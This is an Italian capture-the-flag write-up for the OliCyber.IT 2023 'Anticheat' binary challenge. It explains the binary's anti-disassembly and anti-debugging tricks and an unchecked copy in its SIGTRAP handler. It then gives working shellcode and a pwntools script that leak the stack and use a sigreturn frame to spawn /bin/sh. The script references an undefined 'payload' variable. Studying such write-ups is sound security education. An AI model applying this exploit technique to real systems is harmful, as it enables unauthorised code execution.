# OliCyber.IT 2023 - Competizione Nazionale

## [binary] Anticheat (0 risoluzioni)

La challenge è un binario linkato staticamente che non utilizza nessuna libreria standard. (Opzione -nostdlib di gcc)
Anche se compilato come relocatable object, il base address del binario è sempre lo stesso e la randomizzazione dell'address space è affidata ad una funzione custom in questo stesso binario.

La prima cosa che fa il binario è migrare ad un altro address space randomico, in questo modo:

1. Cerca l'`AUXV` nello stack, e prende la entry `AT_RANDOM` che contiene un puntatore ad un buffer di 16 byte randomici generati dal kernel.

   ```c
   void _main(unsigned long *sp)
   {
       int argc = *sp;
       char **argv = (char **)(sp + 1);
       char **ev = &argv[argc + 1];

       // Get auxv
       Elf64_auxv_t *auxvec;
       {
           char **evp = ev;
           while (*evp++ != NULL)
               ;
           auxvec = (Elf64_auxv_t *) evp;
       }
       Elf64_auxv_t *at_random_entry = auxv_get_entry(auxvec, AT_RANDOM);
       uint64_t *at_random_addr = (void*)at_random_entry->a_un.a_val;
       ...
   ```

2. Legge `/proc/self/maps`
   `read_file("/proc/self/maps", (uint8_t**) &maps_buf, &maps_buf_size);`
3. Crea 2 nuovi mapping ad indirizzi randomici per utilizzarli come codice e stack
4. Copia il codice del binario nella nuova area di memoria
5. Jumpa al nuovo address space, cambiando rip e rsp
6. Cambia i permessi delle vecchie pagine di memoria a `PROT_NONE` in modo che non siano più accessibili
7. Registra un signal handler per ogni segnale.
   ```c
   for (int i = 0; i < 64; i++) {
       struct sigaction sa;
       memset(&sa, 0, sizeof(sa));
       sa.sa_handler = (__sighandler_t)sighandler;
       sa.sa_restorer = (__sigrestore_t)_rt_sigreturn;
       sa.sa_flags = SA_SIGINFO | SA_RESTORER;
       long x = _rt_sigaction(i, &sa, NULL, 8);
       printf("sigaction[%d] = %d\n", i, x);
   }
   ```
8. Prende uno shellcode da stdin
9. Sostituisce dei byte proibiti con `0x90`
   ```c
        buffer_t forbidden_insns[] = {
            // int 0x80
            {"\xcd\x80", 2},
            // Jcc and SYS*
            {"\x0f", 1},
            // CALL
            {"\xe8", 1},
            {"\xff", 1},
            {"\x9a", 1},
            // JMP
            {"\xe9", 1},
            {"\xea", 1},
            // RET
            {"\xc2", 1},
            {"\xc3", 1},
            {"\xca", 1},
            {"\xcb", 1},
            // int3
            {"\xcc", 1},
        };
   ```
10. Lo esegue

In tutto questo, ci sono 2 diversi snippet di assembly che rompono l'analisi dei decompiler e gdb.

### Snippet 1 - Anti Disassembler

Quello che fa questo snippet è equivalente a una `nop`.

1. La call pusha l'indirizzo della prossima istruzione sullo stack, quindi `0x5` in questo caso.
2. La add modifica quello stesso indirizzo, che diventa `0xb`
3. La ret salta a `0xb` che è l'indirizzo della prossima istruzione.

```asm
0:   e8 00 00 00 00          call   0x5
5:   48 83 04 24 06          add    QWORD PTR [rsp], 0x6
a:   c3                      ret
```

### Snippet 2 - Anti Debugger

Questo snippet è un po' più complicato, normalmente il signal handler skippa tutte le istruzioni fino al primo 0x90. Sotto gdb invece il controllo non viene mai passato al signal handler, quindi il binario jumpa a rdx.

```asm
cc                      int3
52                      push   rdx
c3                      ret
e8 4d 41 4e 55          call   0x554e4155
90                      nop
```

### Soluzione

Bug nell'handling di SIGTRAP, il signal handler non controlla quante istruzioni copia nel suo buffer locale che utilizza per calcolare un checksum, facendo l'assunzione che questo meccanismo possa essere utilizzato solamente dagli snippet di anti debugging.

```c
void sighandler(int signum, void * info, void * context)
{
    ...
    else if (signum == SIGTRAP) {
        FUCKUP_DISASM()
        unsigned char insn[0x40];
        memset(insn, 0, sizeof(insn));
        register unsigned char *rip = (void*) ucontext->uc_mcontext.gregs[REG_RIP];
        register unsigned char *it = insn;
        // <0xcc> <crc16[0]> <crc16[1]> <...>
        uint8_t rip_lb = ucontext->uc_mcontext.gregs[REG_RIP] & 0xff;
        uint16_t chk0 = *rip++;
        uint16_t chk1 = *rip++;
        uint16_t chk = chk0 | (chk1 << 8);
        for(;;) {
            uint16_t curchksum = checksum(insn, it - insn);
            printf("rip: %x *rip: %x curchksum: %x chk: %x\n", rip, *rip, curchksum, chk);
            if (*rip == 0x90 || curchksum == chk) {
                break;
            }
            *it++ = *rip++;
        }
        ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)rip;
        return;
    }
```

Come otteniamo dei leak? Mandando una qualsiasi eccezione diversa da SIGTRAP e SIGSEGV ad esempio RIP viene avanzato di 1, quindi un modo semplice è triggerare un SIGILL con `.byte 0x06`, in questo modo lo stack frame del signal handler rimarrà sul nostro stack e potremo leggerlo.

```assembly
.byte 0x06
    mov rdi, rsp
    sub rdi, 0x700
    mov rcx, 0x1000 / 8
scan:
    mov rax, [rdi]
    add rdi, 8
    xor rbx, rbx
    lea rax, [rax * 4]
    lea rax, [rax * 4]
    mov bl, 0x1f
    lea rbx, [rbx * 4]
    lea rbx, [rbx * 4]
    add rcx, 1
    nop
    nop
    nop
    cmp ax, bx
    loopne scan
```

Dopodiche possiamo mettere una istruzione che triggera SIGTRAP alla fine dell'area di memoria rx in modo che il signal handler copi istruzioni dal top della nostra stack, in modo da controllare il buffer overflow. Da li possiamo fare una semplice ROP a sigreturn per ottenere una shell.

```assembly
    push rax
    pop rbx
    shr rbx, 4
    sub rbx, 0x01f
    .byte 0x06
    sub rsp, 0x78
    mov r11, rsp
    movabs r10, {sh:#x}
    mov [r11], r10
    xor r10, r10
    mov [r11+8], r10
    sub rsp, 0x8000
    sub rsp, 0x7000
    // mov r8, rbx
    // add r8, 0x4141
    movabs r10, 0x414141414141
    mov r8, rbx
    add r8, 0x47
    // sigreturn
    mov [rsp+0x78], r8
    mov [rsp+0x80], r8
    mov [rsp+0x88], r8
    mov [rsp+0x90], r8
    mov [rsp+0x98], r8
    mov r8, rbx
    add r8, 0x1f
    // sigreturn
    mov [rsp+0xa0], r8
    mov r10, r11
    mov [rsp+0x110], r10
    movabs r10, 0x3b
    mov [rsp+0x138], r10
    mov r8, rbx
    add r8, 0x45
    mov [rsp+0x150], r8
    movabs r10, 0x33
    mov [rsp+0x160], r10
    movabs r10, 0x9090909090909090
    mov [rsp+0x278], r10
    nop
    nop
    nop
    nop
    nop
    add rsp, 0x8000
    add rsp, 0x7000
    .byte 0xf1, 0x93, 0xaf
```

### Exploit

```python
#!/usr/bin/env python3

from pwn import *


exe = context.binary = ELF("./anticheat-distrib")

sh = u64(b'/bin/sh\x00')
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = 0x4141414141414141 # addr to binsh
#frame.rsi = 0
#frame.rdx = 0
frame.rip = 0x4242424242424242 # addr to syscall
#frame.rsp = 0x4343434343434343 # addr to sigreturn
frame = bytes(frame)
qwords = []
for i in range(0, len(frame), 8):
    qwords.append(u64(frame[i:i+8]))
sp_offset = 0xa8
scode = '\n'.join([f'\tmovabs r10, {qwords[i]:#x}\n\tmov [rsp+{sp_offset+i*8:#x}], r10' for i in range(len(qwords)) if qwords[i] != 0])
print(scode)
##print(qwords)
#exit(0)
scode = f'''
// trigger SIGILL -> fill stack with sighandler frame
.byte 0x06
    mov rdi, rsp
    sub rdi, 0x700
    mov rcx, 0x1000 / 8
scan:
    mov rax, [rdi]
    add rdi, 8
    xor rbx, rbx
    lea rax, [rax * 4]
    lea rax, [rax * 4]
    mov bl, 0x1f
    lea rbx, [rbx * 4]
    lea rbx, [rbx * 4]
    add rcx, 1
    nop
    nop
    nop
    cmp ax, bx
    loopne scan
    push rax
    pop rbx
    shr rbx, 4
    sub rbx, 0x01f
    .byte 0x06
    sub rsp, 0x78
    mov r11, rsp
    movabs r10, {sh:#x}
    mov [r11], r10
    xor r10, r10
    mov [r11+8], r10
    sub rsp, 0x8000
    sub rsp, 0x7000
    // mov r8, rbx
    // add r8, 0x4141
    movabs r10, 0x414141414141
    mov r8, rbx
    add r8, 0x47
    // sigreturn
    mov [rsp+0x78], r8
    mov [rsp+0x80], r8
    mov [rsp+0x88], r8
    mov [rsp+0x90], r8
    mov [rsp+0x98], r8
    mov r8, rbx
    add r8, 0x1f
    // sigreturn
    mov [rsp+0xa0], r8
    mov r10, r11
    mov [rsp+0x110], r10
    movabs r10, 0x3b
    mov [rsp+0x138], r10
    mov r8, rbx
    add r8, 0x45
    mov [rsp+0x150], r8
    movabs r10, 0x33
    mov [rsp+0x160], r10
    movabs r10, 0x9090909090909090
    mov [rsp+0x278], r10
    nop
    nop
    nop
    nop
    nop
    add rsp, 0x8000
    add rsp, 0x7000
    .byte 0xf1, 0x93, 0xaf
'''

def main():
    if args.GDBSERVER:
        io = process(["gdbserver", ":1234", exe.path])
    elif args.REMOTE:
        io = remote("localhost", 1337)
    else:
        io = process(exe.path)
    io.send(asm(scode).rjust(0x1000-0x100, b'\x90'))
    io.send(payload)
    io.interactive()


main()
```
